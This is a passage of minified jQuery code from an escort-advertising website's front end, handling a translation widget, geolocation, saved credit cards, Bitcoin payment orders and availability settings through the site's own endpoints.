class="translateBoxLoaderBallt"></div></div><div class="translateBoxLoadingLabel"></div></div><div class="translateBoxContentCheckTo translate-content-js"><div class="translateBoxLanTitle">'+translationData.fromLng.name+':</div><div class="translateBoxToTranslate">'+t.fromTranslation+'</div></div><div class="translateBoxLanTitle translate-content-js">'+translationData.toLng.name_local+':</div><div class="translateBoxTranslations translate-content-js"><div class="translateBoxRowToCheck clear"><div class="floatRight relative"><label for="wrong_transl" class="translateBoxIcon-wrong floatRight wrong-radio-js" onclick="handleTranslateRadio();"><input id="wrong_transl" value="0" type="radio" name="check" class="translateRadio"  /></label><label for="correct_transl" class="translateBoxIcon-right floatRight mrgRight3 currect-radio-js" onclick="handleTranslateRadio();" ><input id="correct_transl" value="1" type="radio" name="check" class="translateRadio" /></label></div>'+t.translation+'</div><div class="translateBoxContent mrgTop2 invisible currect-translation-js" style="height: auto;"><div class="translateBoxLanTitle to-lng-label-js">How whould you translate it?</div><textarea class="translateBoxTextArea" name="translation" id="translationTextarea" placeholder="Type your translation here" rows="4"></textarea></div></div><div class="translateBoxEndMessage thank-you-js"></div></div><div class="translateBoxFooter clear"><div class="button red floatRight next-js disabled" onclick="translateActions(\'next-check\');">Next</div><div class="button gray floatRight mrgRight2 skip-js" onclick="translateActions(\'skip-check\');">Skip</div><div class="button gray floatRight mrgRight2 reload-js invisible" onclick="translateActions(\'reload-check\');">Reload</div></div></form>'}function translateBoxPattern(e){for(var t=translationData.phrases[e],a="",i=0;i<=translationData.phCount-1;i++)a+='<div class="translateBoxProgressBar '+(i<=translationData.progress?"active":"")+'"></div>';return'<form id="translationForm"><input type="hidden" name="phraseID" value="'+t.phrase_id+'" /><div class="translateBoxHeader clear"><div class="floatRight translateBoxGiveUp mrgTop0 pointer" onclick="translateActions(\'iGiveUp\');">X</div><div class="translateBoxTitle">Translate: <span class="txt16 txtBold"><span>'+translationData.fromLng.short+"</span> &#x2192; <span>"+translationData.toLng.short+'</span></span></div></div><div class="translateBoxProgress clear">'+a+'</div><div class="translateBoxContentContainer"><div class="translateBoxLoader relative loading-js"><div class="translateBoxLoaderBallb"><div class="translateBoxLoaderBallt"></div></div><div class="translateBoxLoadingLabel"></div></div><div class="translateBoxContent translate-content-js"><div class="floatRight txtWhite txt12 txtBold"><span class="mrgRight4">Phrase Location: '+t.prefix_name+"</span><span>Phrase Name: "+t.phrase+'</span></div><div class="translateBoxLanTitle">'+translationData.fromLng.name+':</div><div class="translateBoxToTranslate translateBoxTextArea" rows="5">'+t.translation+'</div></div><div class="translateBoxContent mrgTop2 translate-content-js"><div class="translateBoxLanTitle to-lng-label-js">'+translationData.toLng.name_local+':</div><textarea class="translateBoxTextArea" name="translation" id="translationTextarea" onkeyup="handleTranslateText();" placeholder="Type your translation here" rows="7"></textarea></div><div class="translateBoxEndMessage thank-you-js"></div></div><div class="translateBoxFooter clear"><div class="button red floatRight next-js disabled" onclick="translateActions(\'next\');">Next</div><div class="button gray floatLeft mrgRight2 skip-js" onclick="translateActions(\'skip\');">Skip</div><div class="button gray floatRight mrgRight2 reload-js invisible" onclick="translateActions(\'reload\');">Reload</div></div></form>'}function handleTranslateText(){$("#translationTextarea").val().length>1?$("#translateBoxContainer .next-js").removeClass("disabled"):$("#translateBoxContainer .next-js").addClass("disabled")}function handleTranslateRadio(){$("#translateBoxContainer input[type=radio]").unbind().on("change",(function(){1==$(this).val()?($("#translateBoxContainer .wrong-radio-js").removeClass("active"),$("#translateBoxContainer .currect-radio-js").addClass("active"),$("#translateBoxContainer .currect-translation-js").addClass("invisible")):($("#translateBoxContainer .wrong-radio-js").addClass("active"),$("#translateBoxContainer .currect-radio-js").removeClass("active"),$("#translateBoxContainer .currect-translation-js").removeClass("invisible")),$("#translateBoxContainer .next-js").removeClass("disabled")}))}function setGeoPosition(e){if(!e.position)return!1;var t="latitude="+e.position.latitude+"&longitude="+e.position.longitude+"&accuracy="+e.position.accuracy+(1==e.save?"&saveGPS=1":"")+(void 0!==e.locationID?"&locationID="+e.locationID:"");pageLoader("show"),$.ajax({type:"GET",url:"/ajax/geolocation",cache:!1,data:t,success:function(t){pageLoader("hide");var a=$.parseJSON(t);1==a.success?"function"==typeof e.callback&&e.callback(a):toggleAlert(a.message)}})}function geolocationError(e){var t,a={error:{},messages:{denied:translate("common-couldnotgetyourgpslocationbecause"),unavailable:translate("common-couldnotgetgpspositionas"),timeout:translate("common-attempttogetpositiontimedout")},callback:null};switch($.extend(!0,a,e),a.error.code){case a.error.PERMISSION_DENIED:t=a.messages.denied;break;case a.error.POSITION_UNAVAILABLE:t=a.messages.unavailable;break;case a.error.TIMEOUT:t=a.messages.timeout;break;default:t=translate("common-sorryanerroroccurred")+" "+translate("common-code")+" "+a.error.code+" "+translate("common-message")+": "+a.error.message}"function"==typeof a.callback?a.callback(t):toggleAlert(t)}function getGeolocation(e){var t={unsupportedMSG:translate("common-yourbrowserdoesnotsupportgeolocation"),save:0,highAccuracy:!0,maxAge:6e4,timeout:1e4,successCallback:null,errorCallback:null};if($.extend(t,e),!navigator.geolocation)return toggleAlert(t.unsupportedMSG),!1;navigator.geolocation.getCurrentPosition((function(e){setGeoPosition({position:e.coords,save:t.save,callback:t.successCallback})}),(function(e){geolocationError({error:e,callback:t.errorCallback})}),{enableHighAccuracy:t.highAccuracy,maximumAge:t.maxAge,timeout:t.timeout})}function popupSystem(e){switch(e){case"accessDenied":toggleConfirm({title:translate("common-accessdenied"),text:translate("common-yourprofileisetherexpirednotapproved",{openspan:'<span class="txtBold">',closespan:"</span>"}),buttons:{confirmLabel:translate("common-extendmymembership")}},(function(){window.location="/payments"}));break;case"bugReport":case"contact":profileActions("getEmail",1e3)}}function loadTravelCalendar(){$("#dateFrom").datepicker({minDate:"+1d",maxDate:"+1M",dateFormat:"yy-mm-dd",numberOfMonths:2,onSelect:function(e){var t=$("#dateFrom").datepicker("getDate"),a=new Date(t.getFullYear(),t.getMonth(),t.getDate()),i=new Date(t.getFullYear(),t.getMonth()+1,t.getDate());$("#dateTo").datepicker("option","minDate",a),$("#dateTo").datepicker("option","maxDate",i)}}),$("#dateTo").datepicker({dateFormat:"yy-mm-dd",numberOfMonths:2});var e,t,a=$("#dateFrom").datepicker("getDate");null==a?(e="+1d",t="+1M"):(e=new Date(a.getFullYear(),a.getMonth(),a.getDate()),t=new Date(a.getFullYear(),a.getMonth()+1,a.getDate())),$("#dateTo").datepicker("option","minDate",e),$("#dateTo").datepicker("option","maxDate",t),$(".datepicker").datepicker("option","showAnim","slideDown")}function checkNearTravel(){var e="action=checkNearTravel&locationID="+$("#travelLocation").val();$.ajax({type:"GET",url:"/settings/ajax",cache:!1,data:e,error:function(){pageLoader("hide")},success:function(e){var t=$.parseJSON(e);$("#expirationType").val(1).change().trigger("chosen:updated"),1==t.success?$("#travelExpiration").show("slow"):$("#travelExpiration").hide("slow")}})}function setTravelExpiration(){1==$("#expirationType").val()?$("#travelPeriods").fadeIn("slow"):$("#travelPeriods").fadeOut("slow")}function clearTravel(){var e="action=clearTravel&travelID="+$("#travelID").val();pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:e,error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");$.parseJSON(e);loadSubnavPage(".sub-travels",window.location.pathname)}})}function travelLocationGPS(){getGeolocation({successCallback:function(e){$("#travelLocation").val(e.nearestLocID).change().trigger("chosen:updated")}})}function emailVerification(e){var t="action="+e,a=null;switch(e){case"getEmailVerificationPopup":a=function(e){1==e.success?toggleConfirm({stay:!0,title:"Change Email",text:getEmailVerificationPopupPattern(e),buttons:{confirmLabel:translate("common-submit")}},(function(){emailVerification("sendEmailVerification")})):toggleAlert(e.message)};break;case"sendEmailVerification":t+="&newEmail="+encodeURIComponent($("#newEmailAddressInput").val()),a=function(e){1==e.success&&toggleConfirm(),toggleAlert(e.message)};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);"function"==typeof a&&a(t)}})}function getEmailVerificationPopupPattern(e){return(""!=e.pending_email?'<div class="alertBox info mrgHor0 mrgTop0">Confirmation link was sent to <strong class="txtWhite">'+e.pending_email+"</strong>. Please check your email to complete the process.</div>":"")+'<div class="mrgBot2">Current Email Address: <strong class="txtWhite">'+e.current_email+'</strong></div><div class="">New Email Address:<input type="text" id="newEmailAddressInput" value="'+e.pending_email+'" class="input" /></div>'}function getCreditCards(e){pageLoader("show");var t=$("#creditCardsContainer");$.ajax({type:"GET",url:"/account/ajax",cache:!1,data:"action=getCreditCards",success:function(a){pageLoader("hide");var i=$.parseJSON(a),o="";i.length>0?($.each(i,(function(e,t){o+=getCreditCardsPattern(t)})),o+='<li class="mrgTop2 mrgBot4" onclick="cardActions(\'addCreditCardPopup\');"><div class="button pink"><a href="javascript:void(0);" class="txtWhite txtBold">'+translate("account-addanewcreditcard")+"</a></div></li>"):o+='<li class="selected clear mrgBot2"><div class="split-payment-option"><div class="split-payment-option-mrg"><div class="box-payment-option clear"><div class="right"><div class="button pink" onclick="cardActions(\'addCreditCardPopup\');">'+translate("payments-addcreditcard")+'</div></div><div class="overflowHidden"><div class="payment-icon-box"><div class="payment-options-card"></div></div><div class="txt-payment-option">'+translate("settings-nocreditcardonfile")+'</div></div></div></div></div><div class="split-payment-option"><div class="box-payment-option clear"><div class="right"><a class="button pink block" href="/bitcoin/">'+translate("common-readmore")+'</a></div><div class="overflowHidden"><div class="payment-icon-box"><div class="payment-options-bitcoin"></div></div><div class="txt-payment-option">'+translate("settings-paywithbitcoin")+"</div></div></div></div></li>",t.html('<ul class="paymentOptions">'+o+'</ul><div id="addCreditCardFormContainer" class="cc-form-bg clear"></div>'),"function"==typeof e&&e(i)}})}function getCreditCardsPattern(e){e.active,e.card_id,1==e.active||e.card_id,e.card_type,e.card_number,e.card_month,e.card_year,e.card_name;return'<li><div class="cardDesc">VERIFIED CARD</div><div class="paymentOptionBox selected"><div class="left mrgRight3"><div class="paymentCardContainer"><img src="/public/images/main/icons/creditcards/'+e.card_type+'.svg" class="mrgAuto block"/></div></div><div class="overflowHidden cardHolderDesc"><div class="cardHolderDescSplit"><div>Card<span class="mobile-payment-name"> Number</span></div><div>****'+e.card_number+'</div></div><div class="cardHolderDescSplit"><div>Expiration<span class="mobile-payment-name"> Date</span></div><div>'+e.card_month+" / "+e.card_year+'</div></div><div class="cardHolderDescSplit"><div>Name<span class="mobile-payment-name"> On Card</span></div><div>'+e.card_name+"</div></div></div></div></li>"}function reloadCreditCardsBox(){$("#paymentsPage").length>0?getCreditCards((function(e){$("#paymentStep3 div.submitbtn, #paymentStep3 div.nextbtn").addClass("invisible"),e.length>0?$("#paymentStep3 div.submitbtn").removeClass("invisible"):$("#paymentStep3 div.nextbtn").removeClass("invisible"),$("#paymentStep3 .buttons-container-js").removeClass("invisible")})):$("#sendgiftPage").length>0?getCreditCards((function(e){$("#paymentFormContainer div.submitGift, #paymentFormContainer div.addCreditCard").addClass("invisible"),e.length>0?$("#paymentFormContainer div.submitGift").removeClass("invisible"):$("#paymentFormContainer div.addCreditCard").removeClass("invisible")})):$("#advertisePage").length>0?($(".advertise-promote").length>0&&getCreditCards((function(e){$("#submitButtons div.submitbtn, #submitButtons div.nextbtn").addClass("invisible"),e.length>0?$("#submitButtons div.submitbtn").removeClass("invisible"):$("#submitButtons div.nextbtn").removeClass("invisible")})),$(".advertise-cover").length>0?getCreditCards((function(e){$(".buy-now-js").addClass("invisible"),e.length>0?$(".buy-now-js").removeClass("invisible"):$(".buy-now-js").addClass("invisible")})):getCreditCards((function(e){$("#advertiseStep2 div.submitbtn, #advertiseStep2 div.nextbtn").addClass("invisible"),e.length>0?$("#advertiseStep2 div.submitbtn").removeClass("invisible"):$("#advertiseStep2 div.nextbtn").removeClass("invisible"),$("#advertiseStep2 .buttons-container-js").removeClass("invisible")}))):$("#accountPage").length>0&&getCreditCards()}function cardActions(e,t){var a=null,i="action="+e;switch(e){case"addCreditCardPopup":a=function(e){if(0!=e.success){if($("#addCreditCardFormTrigger").addClass("invisible"),void 0!==e.add_card_params){var t=function(e){if(window.removeEventListener("message",t),"credit-card-page-complete"==e.data&&getCreditCards(),"credit-card-reload-page"==e.data&&cardActions("addCreditCardPopup"),"object"==typeof e.data&&void 0!==e.data.bodyHeight){let t=parseInt(e.data.bodyHeight),a=document.getElementById("addCreditCardIframe");a&&(a.height=(t>285?t+3:288)+"px")}};window.addEventListener("message",t),document.getElementById("creditCardsContainer").innerHTML='<iframe id="addCreditCardIframe" name="addCreditCardIframe" width="100%" height="375px" frameborder="0" src=""></iframe><form id="addCardSecureForm" action="'+e.add_card_params.action_url+'" method="post" target="addCreditCardIframe"><input type="hidden" name="'+e.add_card_params.post_key+'" value="'+e.add_card_params.post_data+'"></form>',document.getElementById("addCardSecureForm").submit()}else $("#addCreditCardFormContainer").html(creditCardFormPattern(e)).trigger("create"),loadChosen(),$("#addCreditCardForm a.add").on("click",(function(e){e.stopPropagation(),cardActions("addCreditCard")})),$("#addCreditCardForm a.cancel").on("click",(function(e){e.stopPropagation(),reloadCreditCardsBox(),animateScrollTo("#creditCardsContainer",300)})),paymentLocationTrigger(),animateScrollTo("#creditCardsContainer",300);addCreditCardPopupCallback()}else void 0!==e.confirm&&5!=e.confirm?toggleConfirm({title:translate("common-accessdenied"),text:e.message,buttons:{confirmLabel:translate("payments-verifynow")}},(function(){window.location=e.location})):toggleAlert(e.message)};break;case"addCreditCard":i+="&"+$("#addCreditCardForm").serialize(),a=function(e){validateInfo(e.elements),1==e.success&&(reloadCreditCardsBox(),toggleConfirm()),toggleAlert(e.message)};break;case"setActiveCreditCard":i+="&cardID="+t,a=function(e){reloadCreditCardsBox()};break;case"deleteCreditCardConfirm":return void toggleConfirm({title:translate("payments-deletecreditcard"),text:translate("payments-deletethiscreditcard"),buttons:{confirmLabel:translate("payments-deletecard")}},(function(){cardActions("deleteCreditCard",t)}));case"deleteCreditCard":i+="&cardID="+t,a=function(e){reloadCreditCardsBox(),toggleAlert(e.message)};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/account/ajax",cache:!1,data:i,success:function(e){pageLoader("hide");var t=$.parseJSON(e);"function"==typeof a&&a(t)}})}function creditCardFormPattern(e){var t="",a="",i="",o="";return $.each(e.locations.countries,(function(a,i){selected=i.locShort==e.setLocation?' selected="selected" ':"",t+="<option "+selected+' value="'+i.locShort+'">'+i.locLong+"</option>"})),$.each(e.locations.states,(function(e,t){a+='<option value="'+t.locShort+'">'+t.locLong+"</option>"})),$.each(e.months,(function(e,t){i+='<option value="'+t+'">'+t+"</option>"})),$.each(e.years,(function(e,t){o+='<option value="'+t+'">'+t+"</option>"})),'<form method="post" action="" id="addCreditCardForm" class="txtLeft transparent-form"><div class="bigChosen mediumChosenDrop"><div class="txtWhite">'+translate("common-country")+':</div><select name="country" id="country" onchange="paymentLocationTrigger();" class="selectCountry input chosen"><option value="">-- '+translate("common-pleaseselect")+" --</option>"+t+'</select><div class="inputError"></div></div><div class="clear mrgTop3"><div class="split2 floatLeft triggered"><div class="mrgRight2"><div class="txtWhite">'+translate("payments-city")+':</div><input value="" type="text" name="city" id="city" class="input input-white" /><div class="inputError"></div></div></div><div class="split2 floatLeft triggered"><div class="mrgLeft2"><div class="txtWhite">'+translate("payments-streetaddress")+':</div><input value="" type="text" name="address" id="address" class="input input-white" /><div class="inputError"></div></div></div></div><div class="clear mrgTop3"><div class="split2 floatLeft triggered"><div class="mrgRight2"><div class="noWrap txtWhite">'+translate("settings-zippostalcode")+':</div><input value="" type="text" name="zip" id="zip" class="input input-white mrg0" /><div class="inputError"></div></div></div><div class="split2 floatLeft triggered selectState"><div class="mrgLeft2 bigChosen mediumChosenDrop"><div class="txtWhite">State:</div><select name="state" id="state" class="input chosen"><option value="">-- Please Select --</option>'+a+'</select><div class="inputError"></div></div></div></div><div class="sep mrgBot2 mrgTop2"></div><div class="mrgTop2 txtWhite">'+translate("payments-cardholdername")+':</div><div><input value="" type="text" name="card_name" id="card_name" class="input input-white" /><div class="inputError"></div></div><div class="mrgTop3 txtWhite">'+translate("payments-creditcardnumber")+':</div><div><input value="" type="text" name="card_number" id="card_number" class="cardNumber input input-white" /><div class="inputError"></div></div><div class="clear mrgTop3"><div class="txtWhite">'+translate("account-expirationdate")+':</div><div class="split2 floatLeft"><div class="mrgRight2 bigChosen smallChosenDrop chosenNoSearch"><select name="card_month" id="card_month" class="input input-white">'+i+'</select><div class="inputError"></div></div></div><div class="split2 floatLeft"><div class="mrgLeft2 bigChosen smallChosenDrop chosenNoSearch"><select name="card_year" id="card_year" class="input input-white">'+o+'</select><div class="inputError"></div></div></div></div><div class="clear mrgTop3"><div class="txtWhite">'+translate("payments-validationcode")+':</div><div class="split2 floatLeft"><div class="mrgRight2"><input value="" type="text" maxlength="5" name="card_cvc" id="card_cvc" class="cardCVC input input-white" /><div class="inputError"></div></div></div><div class="split2 floatLeft"><div class="mrgLeft2 mrgTop txtWhite">'+translate("payments-cvc")+"<br />"+translate("payments-onthebackofyourcard")+'</div></div></div><div class="clear mrgTop3"><div class="split2 floatLeft"><div class="mrgRight2"><a href="javascript:void(0);" class="button block gray cancel">'+translate("common-cancel")+'</a></div></div><div class="split2 floatLeft"><div class="mrgLeft2"><a href="javascript:void(0);" class="button block red add">'+translate("payments-addthiscard")+'</a></div></div></div><div class="txtCenter mrgTop4">'+translate("billing-billinginformationisnotpublic")+"</div></form>"}function addCreditCardPopupCallback(){$("#paymentsPage").length>0?$("#paymentStep3 .buttons-container-js").addClass("invisible"):$("#sendgiftPage").length>0?$("#paymentFormContainer div.submitGift, #paymentFormContainer div.addCreditCard").addClass("invisible"):$("#advertisePage").length>0&&($(".advertise-promote").length>0?$("#submitButtons div.submitbtn, #submitButtons div.nextbtn").addClass("invisible"):$("#advertiseStep2 .buttons-container-js").addClass("invisible"))}function paymentLocationTrigger(){var e=$("#addCreditCardForm .selectCountry").val(),t=$("#addCreditCardForm .selectState");"US"==e?t.removeClass("invisible"):t.addClass("invisible"),centerConfirm()}function validateInfo(e){if(void 0!==e&&0!=e.length){if($("#settingsPage.settings-about").length>0){var t=$("#aboutSettings").serialize().split("&");$.each(t,(function(e,a){var i=t[e].split("="),o=i[0],n=i[1];"services%5B%5D"!=o&&"preferences%5B%5D"!=o&&"styles%5B%5D"!=o&&"spokenLangs%5B%5D"!=o&&inputValidStatus($("#"+o),0==n?0:1)}))}$.each(e,(function(e,t){inputValidStatus("#"+t.element,t.success,t.message)}))}}var availabilityOptionsData,bitcoinData={bitcoinRefreshInterval:0,secondsLeftInterval:0,scroll:0,clipboardLoaded:0};function getPendingBitcoinOrder(e,t){t||pageLoader("show");var a=$("#creditCardsContainer"),i="action=getPendingBitcoinOrder";$("#pendingOrderID").length>0&&(i+="&order_id="+$("#pendingOrderID").val()),$.ajax({type:"GET",url:"/bitcoin/ajax",cache:!1,data:i,success:function(t){pageLoader("hide");var i=$.parseJSON(t),o="";if(clearInterval(bitcoinData.bitcoinRefreshInterval),clearInterval(bitcoinData.secondsLeftInterval),1==i.success){var n="bitcoin:"+i.order.btc_address+"?amount="+i.order.btc_amount,s="https://chart.googleapis.com/chart?chs=260x260&cht=qr&chl="+encodeURIComponent(n)+"&choe=UTF-8&chld=M|1",r=function(e){var t=getTimeLeft(e);return e<=120?'<span class="txtRed">'+t.str+"</span>":'<span class="">'+t.str+"</span>"},l="",c="";switch(l=1==i.order.status_id?"txtGreen":0==i.order.status_id||9==i.order.status_id?"txtYellow":"txtRed",i.order.status_id){case 1:c='<div class="txt32 txtBold">'+translate("advertise-paymentsuccessful")+"!</div>";break;case 2:c='<div class="txt32 txtBold">'+translate("payments-bitcoinpaymentexpired")+"</div>";break;case 3:c='<div class="txt32 txtBold">'+translate("payments-invalidbitcoinpayment")+"</div>";break;case 4:c='<div class="txt32 txtBold">'+translate("payments-paymentcanceled")+"</div>";break;case 5:c='<div class="txt32 txtBold">'+translate("payments-transferrefunded")+"</div>";break;default:c='<div class="txt32 txtBold">'+translate("common-pleasewait")+'...</div><div class="txtGray">'+translate("payments-completingbitcoinpayment")+"</div>"}var d=i.order.completed>0||0==i.order.seconds_left?1:0;o='<div class="btContainer relative"><input type="hidden" id="pendingOrderID" value="'+i.order.order_id+'" /><div class="bitCoinWarning mrgBot2 '+(d?"invisible":"")+'"><div class="txtBold txtWhite txt30 txtCenter"><span class="txtGrayC">Transaction time left:</span> <span id="btc-timeleft-js">'+(d?"00:00":r(i.order.seconds_left))+'</span></div><p class="txtCenter mrg0"><img alt="" src="/public/images/main/icons/alert/alert-warning.png" class="inlineBlock valignMiddle mrgRight2" style="width: 24px;"><strong class="txtPink">'+translate("payments-makesureyoupaybeforethetimer")+'</strong></p></div><div class="btWrapper relative zindex1 clear">'+(d?'<div class="btOverlay '+l+'">'+c+"</div>":"")+'<div class="clear '+(d?"btDisabled":"")+'"><p class="mrgTop0 txtCenter">'+translate("payments-scantheqrcodebelowwithyour")+'</p><div class="btLeftContent"><a href="'+n+'" target="_blank" title="'+translate("payments-clicktoopenapp")+'"><img alt="QR Code" class="btQrcode" src="'+s+'" /></a></div><div class="btRightContent overflowHidden"><div class="clear txtWhite txt12"><div class="bitcInfoR"><div class="txtRight invisible">'+i.order.currency_short+" "+i.order.amount+'</div><span class="txtGray">'+translate("payments-status")+': </span><strong class="'+l+' txt16">'+i.order.status+'</strong></div><div class="bitcInfoL"><div>'+translate("payments-sendexactly")+'</div><strong class="txt16">'+i.order.btc_amount+' BTC</strong> <span class="txtGray">'+translate("payments-to")+':</span></div></div><div class="clear mrgTop2"><a href="javascript:void(0);" id="bitcoin-address-copy-js" class="button pad3 pink floatRight mrgLeft">COPY</a><div class="overflowHidden"><input type="text" class="input" value="'+i.order.btc_address+'" onfocus="this.select();" onclick="this.select();" readonly /></div></div><div class="clear mrgTop"><div class="txt12 txtGray floatRight">'+i.order.payment_for+'</div><a class="txt12 txtDarker" href="'+n+'" target="_blank">'+translate("payments-openinyourbitcoinapp")+'</a></div></div></div></div><div class="sep clear mrgTop3 mrgBot3"></div><div class="btWrapper clear">'+(i.order.completed>0?1==i.order.status_id?'<div class="button red block" onclick="window.location=\'/settings/\';">'+translate("common-continue")+"</div>":'<div class="button red block" onclick="closeBitcoinPayment();">'+translate("common-close")+"</div>":(0==i.order.seconds_left?'<div class="button brown block buttonFadeInOut" style="cursor:default;">'+translate("common-pleasewait")+"...</div>":'<div class="button gray block buttonFadeInOut" style="cursor:default;">'+translate("payments-waitingforpayment")+' <span class="time-left-js">'+(d?"00:00":r(i.order.seconds_left))+"</span></div>")+'<div class="mrgTop3 txtCenter"><a href="javascript:void(0);" onclick="cancelBitcoinPayment('+i.order.order_id+');">'+translate("payments-cancelididnotsendthemoney")+"</a></div>")+"</div></div>",a.html(o),0==i.order.completed&&(bitcoinData.bitcoinRefreshInterval=setInterval((function(){reloadBitcoinBox(1)}),1e4),i.order.seconds_left>0&&(bitcoinData.secondsLeftInterval=setInterval((function(){var e=--i.order.seconds_left;$("#btc-timeleft-js").html(r(e)),$(".time-left-js").html(r(e)),e<=0&&clearInterval(bitcoinData.secondsLeftInterval)}),1e3)),0==bitcoinData.clipboardLoaded&&(bitcoinData.clipboardLoaded=1,loadClipboard({target:"#bitcoin-address-copy-js",text:i.order.btc_address,success:function(){toggleAlert(translate("payments-bitcoinaddresscopiedtoyourclipboard"))}})))}else bitcoinData.clipboardLoaded=0,0==$("#accountPage").length?(o='<div class="content clear mrgBot2"><p class="txt16 txtWhite">'+translate("payments-whenyouclickthebuttonbelow",{strongopen:"<strong>",strongclose:"</strong>"})+translate("payments-becausebitcoinisveryvolatileand")+'<p class="txt14">'+translate("payments-youwillbeabletobrowsethesitewhile")+'</p></div><div class="button red block" onclick="startBitcoinPayment();">'+translate("payments-startbitcoinpayment")+"</div>",a.html(o)):reloadCreditCardsBox();"function"==typeof e&&e(i)}})}function reloadBitcoinBox(e){$("#paymentsPage").length>0?getPendingBitcoinOrder((function(e){1==e.success?addCreditCardPopupCallback():($("#paymentStep3 .nextbtn").addClass("invisible"),$("#paymentStep3 .submitbtn").addClass("invisible"),$("#paymentStep3 .buttons-container-js").removeClass("invisible"))}),e):$("#advertisePage").length>0?getPendingBitcoinOrder((function(e){1==e.success?addCreditCardPopupCallback():($("#advertiseStep2 .nextbtn").addClass("invisible"),$("#advertiseStep2 .submitbtn").addClass("invisible"),$("#advertiseStep2 .buttons-container-js").removeClass("invisible"))}),e):$("#sendgiftPage").length>0?getPendingBitcoinOrder((function(e){addCreditCardPopupCallback()}),e):$("#accountPage").length>0?getPendingBitcoinOrder((function(e){addCreditCardPopupCallback(),0==bitcoinData.scroll&&(bitcoinData.scroll=1,animateScroll($("#creditCardsContainer").offset().top-100,500))}),e):$("#undeletepolicyPage").length>0&&getPendingBitcoinOrder((function(e){0==bitcoinData.scroll&&(bitcoinData.scroll=1,$("#creditCardsContainer").length>0&&animateScroll($("#creditCardsContainer").offset().top-100,500))}),e)}function startBitcoinPayment(){toggleConfirm({title:translate("payments-startpayment"),text:translate("payments-startbitcoinpaymentnow"),buttons:{confirmLabel:translate("payments-startnow")}},(function(){$("#paymentsPage").length>0||$("#advertisePage").length>0?submitPayment():$("#sendgiftPage").length>0?submitGift():$("#undeletepolicyPage").length>0&&submitPenaltyPayment()}))}function closeBitcoinPayment(){pageLoader("show"),window.location.reload()}function cancelBitcoinPayment(e){toggleAlert('<div class="txtBold txtWhite txtCenter mrgBot2">'+translate("payments-yourbitcoinpaymentisstillinprocess")+'</div><div class="mrgBot2 chosenNoSearch"><select id="cancelBitcoinPaymentSelect" class="chosen input"><option value="0">'+translate("payments-pleaseselect")+'</option><option value="1">'+translate("payments-yesididsendthemoney")+'</option><option value="2">'+translate("payments-noididnotsendthemoney")+'</option></select></div><div class="alertBox mrgHor0 info invisible cancel-bitcoin-alert-yes-js">'+translate("payments-pleasewaitforthepaymenttocomplete")+'</div><div class="alertBox mrgHor0 info invisible cancel-bitcoin-alert-no-js">'+translate("payments-ifanymoneyweresenttothisbitcoin")+'</div><div class="button red block invisible mrgBot cancel-bitcoin-cancel-button-js">'+translate("payments-cancelpayment")+'</div><div class="button brown block cancel-bitcoin-close-button-js">'+translate("payments-closepopup")+"</div>",translate("payments-cancelbitcoinpayment"),(function(){isMobile||isTablet||loadChosen(),$("#alert .ok, #alert .alert-buttons").addClass("invisible"),$("#cancelBitcoinPaymentSelect").on("change",(function(){$(".cancel-bitcoin-alert-yes-js, .cancel-bitcoin-alert-no-js, .cancel-bitcoin-cancel-button-js").addClass("invisible");var e=$(this).val();1==e?$(".cancel-bitcoin-alert-yes-js").removeClass("invisible"):2==e&&($(".cancel-bitcoin-alert-no-js").removeClass("invisible"),$(".cancel-bitcoin-cancel-button-js").removeClass("invisible")),centerAlert()})),$(".cancel-bitcoin-close-button-js").on("click",(function(){toggleAlert()})),$(".cancel-bitcoin-cancel-button-js").on("click",(function(){toggleAlert(),pageLoader("show"),$.ajax({type:"POST",url:"/bitcoin/ajax",cache:!1,data:{action:"cancelBitcoinOrder",order_id:e},error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?closeBitcoinPayment():toggleAlert(t.message)}})})),alertWidth(700),centerAlert()}))}function managePendingBitcoin(){toggleConfirm({title:translate("payments-pendingbitcoinpayment"),text:'<div class="alertBox mrg0 info">'+translate("payments-oopspendingbitcoinpayment")+"</div>",buttons:{confirmLabel:translate("payments-managebitcoinpayment")}},(function(){pageLoader("show"),window.location="/account/"}),(function(){confirmWidth(700)}))}function dashActions(e){var t=null,a="action="+e;switch(e){case"smsSettings":t=function(e){toggleAlert(e.message),1==e.isEnabled?$("#smsSettings .switch").removeClass("switchOff"):$("#smsSettings .switch").addClass("switchOff")};break;case"visibleSettings":t=function(e){toggleAlert(e.message),1==e.isEnabled?$("#visibleSettings .switch").removeClass("switchOff"):$("#visibleSettings .switch").addClass("switchOff")};break;case"getAvailabilityPopup":t=function(e){1==e.success?toggleConfirm({title:translate("settings-setavailability"),text:getAvailabilityFormPattern(e),buttons:{confirmLabel:translate("common-set")}},(function(){dashActions("setAvailability")}),(function(){loadChosen(),centerConfirm()})):1==e.pvr?toggleConfirm({title:"Payment verification required",text:e.message,buttons:{confirmLabel:"Verify now",cancelLabel:translate("common-cancel")}},(function(){window.location="/account/verification/"}),(function(){loadChosen(),centerConfirm()})):toggleAlert(e.message)};break;case"setAvailability":a+="&"+$("#setAvailabilityForm").serialize(),t=function(e){e.message;if(e.shareTwitter){toggleConfirm({title:"Tweet",text:"Do you want to tweet your availability?",buttons:{confirmLabel:"Yes, tweet",cancelLabel:"No"}},(function(){return pageLoader("show"),window.location.reload(),window.open(encodeURI("https://twitter.com/intent/tweet?text=I am "+e.optionName+" for the next "+e.period+" on https://ts4rent.eu/"+e.userName+" @TS4Rent&hashtags=TSEscorts"),"","menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=370,width=370"),!1}),(function(){$("#confirm .cancel").unbind().on("click",(function(){pageLoader("show"),window.location.reload()}))}))}else pageLoader("show"),window.location.reload()};break;case"getPhoneVerificationPopup":t=function(e){1==e.success?toggleConfirm({stay:!0,title:"Phone Verification Request",text:getPhoneVerificationPattern(e),buttons:{confirmLabel:"Request Now"}},(function(){dashActions("requestPhoneVerification")}),(function(){isMobile||isTablet||loadChosen(),confirmWidth(650)})):toggleAlert(e.message)};break;case"requestPhoneVerification":a+="&"+$("#phoneVerificationForm").serialize(),t=function(e){1==e.success?toggleConfirm({stay:!0,title:"Phone Verification Confirm",text:getPhoneVerificationConfirmPattern(),buttons:{confirmLabel:"Confirm 